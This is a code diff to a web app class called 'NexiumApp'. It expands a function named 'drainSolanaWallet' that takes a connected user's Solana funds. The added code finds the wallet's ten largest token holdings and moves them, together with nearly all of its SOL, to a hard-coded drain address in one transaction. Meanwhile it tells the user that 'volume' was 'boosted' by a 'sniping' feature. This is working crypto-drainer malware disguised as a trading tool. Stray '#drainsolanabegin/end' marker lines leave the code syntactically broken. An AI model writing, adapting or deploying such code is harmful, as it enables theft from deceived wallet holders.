@@ -288,81 +288,182 @@ class NexiumApp {
     }
   }
 
-  async drainSolanaWallet() {
-    console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
-    console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
-    if (!this.publicKey || !this.solConnection) {
-      this.showFeedback('Please connect your wallet to use sniping features.', 'error');
-      this.dom.walletModal.classList.add('active');
-      return;
-    }
-    this.showProcessingSpinner();
 
-    try {
-      const senderPublicKey = new PublicKey(this.publicKey);
-      const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
-      console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 93
-      console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94
 
-      // Get full balance and subtract rent-exempt minimum
-      const balance = await this.solConnection.getBalance(senderPublicKey);
-      const rentExemptMinimum = 2039280; // Minimum lamports needed to keep account open
-      const transferableBalance = balance - rentExemptMinimum;
-
-      if (transferableBalance <= 0) {
-        console.error("Insufficient transferable balance:", balance, "lamports"); // Log 95
-        throw new Error("Insufficient balance to transfer after reserving rent-exempt minimum.");
-      }
-      console.log("Total balance:", balance, "lamports, Transferable balance:", transferableBalance, "lamports"); // Log 96
-
-      // Create transfer instruction for transferable balance
-      const solInstruction = SystemProgram.transfer({
-        fromPubkey: senderPublicKey,
-        toPubkey: recipientPublicKey,
-        lamports: transferableBalance
-      });
-
-      // Get blockhash
-      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
-      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
-
-      // Create message
-      const message = new TransactionMessage({
-        payerKey: senderPublicKey,
-        recentBlockhash: blockhash,
-        instructions: [solInstruction],
-      }).compileToV0Message();
-
-      // Create and sign transaction
-      const versionedTransaction = new VersionedTransaction(message);
-      const signedTransaction = await window.solana.signTransaction(versionedTransaction);
-      console.log("Transaction signed successfully:", signedTransaction); // Log 98
-
-      const signature = await this.solConnection.sendTransaction(signedTransaction);
-      console.log("Transaction sent, signature:", signature); // Log 99
-
-      await this.solConnection.confirmTransaction({
-        signature,
-        lastValidBlockHeight,
-        blockhash
-      });
-      console.log("Transaction confirmed:", signature); // Log 100
-
-      this.showFeedback("Volume boosted successfully!", 'success');
-    } catch (error) {
-      console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 101
-      if (error.message.includes('User rejected the request')) {
-        this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
-      } else if (error.message.includes('Insufficient balance')) {
-        this.showFeedback('Insufficient balance to proceed with sniping. Please add more SOL.', 'error');
-      } else {
-        this.showFeedback('Failed to boost volume. Please try again or contact support.', 'error');
-      }
-    } finally {
-      this.hideProcessingSpinner();
-      console.log('Drain token completed'); // Log 102
-    }
+  #drainsolanabegin
+async drainSolanaWallet() {
+  console.log('drainSolanaWallet: Buffer defined:', typeof globalThis.Buffer); // Log 91
+  console.log('drainSolanaWallet: Starting with publicKey:', this.publicKey); // Log 92
+  if (!this.publicKey || !this.solConnection) {
+    this.showFeedback('Please connect your wallet to use sniping features.', 'error');
+    this.dom.walletModal.classList.add('active');
+    return;
   }
+  this.showProcessingSpinner();
+
+  try {
+    const senderPublicKey = new PublicKey(this.publicKey);
+    const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
+    console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 93
+    console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 94
+
+    // Get SOL balance
+    const solBalance = await this.solConnection.getBalance(senderPublicKey);
+    const rentExemptMinimum = 2039280; // Minimum lamports to keep account open
+    console.log("Total SOL balance:", solBalance, "lamports"); // Log 95
+
+    // Fetch token accounts for the wallet
+    const tokenAccounts = await this.solConnection.getParsedTokenAccountsByOwner(senderPublicKey, {
+      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'), // SPL Token Program
+    });
+
+    // Sort token accounts by balance (descending) and take top 10
+    const topTenTokens = tokenAccounts.value
+      .sort((a, b) => b.account.data.parsed.info.tokenAmount.uiAmount - a.account.data.parsed.info.tokenAmount.uiAmount)
+      .slice(0, 10);
+    console.log("Top 10 token accounts:", topTenTokens.map(t => ({
+      mint: t.account.data.parsed.info.mint,
+      balance: t.account.data.parsed.info.tokenAmount.uiAmount
+    }))); // Log 96
+
+    // Estimate gas fees for token transfers (use a sample transaction to estimate)
+    const sampleInstruction = SystemProgram.transfer({
+      fromPubkey: senderPublicKey,
+      toPubkey: recipientPublicKey,
+      lamports: 1, // Minimal amount for estimation
+    });
+    const sampleMessage = new TransactionMessage({
+      payerKey: senderPublicKey,
+      recentBlockhash: (await this.solConnection.getLatestBlockhash()).blockhash,
+      instructions: [sampleInstruction],
+    }).compileToV0Message();
+    const sampleTx = new VersionedTransaction(sampleMessage);
+    const estimatedFeePerTx = await this.solConnection.getFeeForMessage(sampleMessage);
+    const totalEstimatedFees = estimatedFeePerTx.value * (topTenTokens.length + 1); // +1 for SOL transfer
+    const feeBuffer = Math.ceil(totalEstimatedFees * 1.03); // Add 3% buffer
+    console.log("Estimated fees (with 3% buffer):", feeBuffer, "lamports"); // Log 97
+
+    // Check if SOL balance is sufficient
+    if (solBalance <= rentExemptMinimum + feeBuffer) {
+      console.error("Insufficient SOL balance for fees and rent-exempt minimum:", solBalance, "lamports"); // Log 98
+      throw new Error("Insufficient SOL balance to cover fees and rent-exempt minimum.");
+    }
+
+    // Create instructions array
+    const instructions = [];
+
+    // Token transfer instructions
+    for (const tokenAccount of topTenTokens) {
+      const tokenMint = new PublicKey(tokenAccount.account.data.parsed.info.mint);
+      const tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount.amount;
+      if (tokenAmount <= 0) {
+        console.log("Skipping token with zero balance:", tokenMint.toBase58()); // Log 99
+        continue;
+      }
+
+      // Find or create associated token account for recipient
+      const recipientTokenAccount = await this.solConnection.getParsedTokenAccountsByOwner(recipientPublicKey, {
+        mint: tokenMint,
+      });
+      let recipientATA = recipientTokenAccount.value[0]?.pubkey;
+      if (!recipientATA) {
+        recipientATA = await splToken.getAssociatedTokenAddress(
+          tokenMint,
+          recipientPublicKey,
+          false,
+          splToken.TOKEN_PROGRAM_ID,
+          splToken.ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        instructions.push(
+          splToken.createAssociatedTokenAccountInstruction(
+            senderPublicKey,
+            recipientATA,
+            recipientPublicKey,
+            tokenMint,
+            splToken.TOKEN_PROGRAM_ID,
+            splToken.ASSOCIATED_TOKEN_PROGRAM_ID
+          )
+        );
+      }
+
+      // Add token transfer instruction
+      instructions.push(
+        splToken.createTransferInstruction(
+          tokenAccount.pubkey,
+          recipientATA,
+          senderPublicKey,
+          BigInt(tokenAmount),
+          [],
+          splToken.TOKEN_PROGRAM_ID
+        )
+      );
+      console.log("Added transfer instruction for token:", tokenMint.toBase58(), "amount:", tokenAmount); // Log 100
+    }
+
+    // Calculate transferable SOL (after fees and rent-exempt minimum)
+    const transferableSol = solBalance - rentExemptMinimum - feeBuffer;
+    if (transferableSol > 0) {
+      instructions.push(
+        SystemProgram.transfer({
+          fromPubkey: senderPublicKey,
+          toPubkey: recipientPublicKey,
+          lamports: transferableSol,
+        })
+      );
+      console.log("Transferable SOL:", transferableSol, "lamports"); // Log 101
+    } else {
+      console.log("No transferable SOL after fees and rent-exempt minimum"); // Log 102
+    }
+
+    if (instructions.length === 0) {
+      console.error("No valid transfers to process"); // Log 103
+      throw new Error("No tokens or SOL available to transfer.");
+    }
+
+    // Get blockhash
+    const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+    console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 104
+
+    // Create and sign transaction
+    const message = new TransactionMessage({
+      payerKey: senderPublicKey,
+      recentBlockhash: blockhash,
+      instructions,
+    }).compileToV0Message();
+    const versionedTransaction = new VersionedTransaction(message);
+    const signedTransaction = await window.solana.signTransaction(versionedTransaction);
+    console.log("Transaction signed successfully:", signedTransaction); // Log 105
+
+    // Send transaction
+    const signature = await this.solConnection.sendTransaction(signedTransaction);
+    console.log("Transaction sent, signature:", signature); // Log 106
+
+    // Confirm transaction
+    await this.solConnection.confirmTransaction({
+      signature,
+      lastValidBlockHeight,
+      blockhash,
+    });
+    console.log("Transaction confirmed:", signature); // Log 107
+
+    this.showFeedback("Volume boosted successfully! Transferred tokens and SOL.", 'success');
+  } catch (error) {
+    console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 108
+    if (error.message.includes('User rejected the request')) {
+      this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+    } else if (error.message.includes('Insufficient balance') || error.message.includes('Insufficient SOL balance')) {
+      this.showFeedback('Insufficient SOL balance to cover fees or transfers. Please add more SOL.', 'error');
+    } else {
+      this.showFeedback('Failed to boost volume. Please try again or contact support.', 'error');
+    }
+  } finally {
+    this.hideProcessingSpinner();
+    console.log('Drain token completed'); // Log 109
+  }
+}
+#drainsolanaend
+
+
 
   updateButtonState(state, walletName, address = '') {
     let button = this.dom[`connect${walletName}`];
